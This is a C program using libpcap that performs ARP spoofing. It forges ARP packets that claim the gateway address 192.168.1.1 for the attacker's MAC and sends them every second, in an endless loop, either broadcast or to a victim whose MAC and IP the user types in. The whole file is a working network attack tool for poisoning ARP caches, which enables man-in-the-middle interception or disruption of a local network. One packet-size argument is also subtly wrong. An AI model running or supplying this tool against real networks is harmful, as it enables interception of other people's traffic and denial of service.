#include "head.h"

u_char TARGET_MAC[6]; //victim's mac
u_char SOURCE_MAC[6]; //attacker's mac
u_char TARGET_IP[4]; //victim's ip
u_char SOURCE_IP[4] = {192,168,1,1}; //gateway's ip


//构建ARP数据包
void ARP_packet_build(u_char *ARPpacket, int packetsize,
u_char *dst_mac, u_char *dst_ip, u_char *src_mac, u_char *src_ip, u_short op) {
    printf("ARP packet building\n");
    ethernet_header ehead;
    arp_header ahead;
    memset(ARPpacket, 0, packetsize);
    //处理victim相关
    if (op == 1) { //ARP请求包
        memset(ehead.DST_mac, 0xff, 6);
        memset(ahead.dest_mac, 0x00, 6);
        memset(ahead.dest_ip, 0, 4);
    }
    else { //ARP相应包
        memcpy(ehead.DST_mac, TARGET_MAC, 6);
        memcpy(ahead.dest_mac, TARGET_MAC, 6);
        memcpy(ahead.dest_ip, TARGET_IP, 4);
    }
    //处理attacker相关
    memcpy(ehead.SRC_mac, src_mac, 6);
    memcpy(ahead.src_mac, src_mac, 6);
    memcpy(ahead.src_ip, src_ip, 4);
    //填充其他部分
    ehead.eth_type = htons((u_short)EPT_ARP);
    ahead.hardware_type = htons((u_short)1);
    ahead.protocol_type = htons((u_short)EPT_IPv4);
    ahead.hardware_len = (u_char)6;
    ahead.protocol_len = (u_char)4;
    ahead.arp_option = htons((u_short)op);
    //合并
    memcpy(ARPpacket, &ehead, sizeof(ehead));
    memcpy(ARPpacket + sizeof(ehead), &ahead, sizeof(ahead));
    loading();
}

//发包
void send_packet(pcap_t *handle, u_char *packet, int packetsize) {
    if (pcap_sendpacket(handle, packet, packetsize) != 0)
        printf("Packet send failed!\n");
}

int main(int argc, char const *argv[]) {
    pcap_t *handle;
    char *dev; //存储网卡设备
    char errbuf[PCAP_ERRBUF_SIZE] = {0}; //存储错误信息
    u_char ARPpacket[42]; //ARP包
    //第一步，初始化攻击资源
    printf("Finding device\n");
    dev = pcap_lookupdev(errbuf); //返回寻找到的第一个网络设备的指针
    if (dev == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }
    loading();
    printf("Device: %s\n", dev);
    //打开网卡，获取其描述字
    printf("Opening device\n");
    handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
    if (handle == NULL) {
        printf("%s\n", errbuf);
        printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
        exit(1);
    }
    loading();
    //准备攻击资源
    int op;
    printf("Please choose mode:\n");
    printf("\t1: Broadcast you ARP packet\n");
    printf("\t2: Choose a specific victim\n\nYour choose: ");
    scanf("%d", &op);
    if (op == 2) {
        printf("Please enter your victim's MAC (format: aa:aa:aa:aa:aa:aa)\n");
        scanf("%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
        &TARGET_MAC[0], &TARGET_MAC[1], &TARGET_MAC[2], &TARGET_MAC[3], &TARGET_MAC[4], &TARGET_MAC[5]);
        printf("Please enter your victim's IP (format: 192.168.1.0)\n");
        scanf("%hhd.%hhd.%hhd.%hhd", &TARGET_IP[0], &TARGET_IP[1], &TARGET_IP[2], &TARGET_IP[3]);
        printf("Please enter your MAC (format: aa:aa:aa:aa:aa:aa)\n");
        scanf("%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
        &SOURCE_MAC[0], &SOURCE_MAC[1], &SOURCE_MAC[2], &SOURCE_MAC[3], &SOURCE_MAC[4], &SOURCE_MAC[5]);
        ARP_packet_build(ARPpacket, sizeof*(ARPpacket), TARGET_MAC, TARGET_IP, SOURCE_MAC, SOURCE_IP, op);    
    }
    else if (op == 1){
        printf("Please enter your MAC (format: aa:aa:aa:aa:aa:aa)\n");
        scanf("%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
        &SOURCE_MAC[0], &SOURCE_MAC[1], &SOURCE_MAC[2], &SOURCE_MAC[3], &SOURCE_MAC[4], &SOURCE_MAC[5]);
        ARP_packet_build(ARPpacket, sizeof*(ARPpacket), NULL, NULL, SOURCE_MAC, SOURCE_IP, op);
    }
    else {
        printf("Please enter 1 or 2 !");
        exit(1);
    }
    int i = 0;
    while (1) {
        send_packet(handle, ARPpacket, sizeof(ARPpacket));
        printf("Packet %d send.\n", ++i);
        usleep(1e6);
    }
    return 0;
}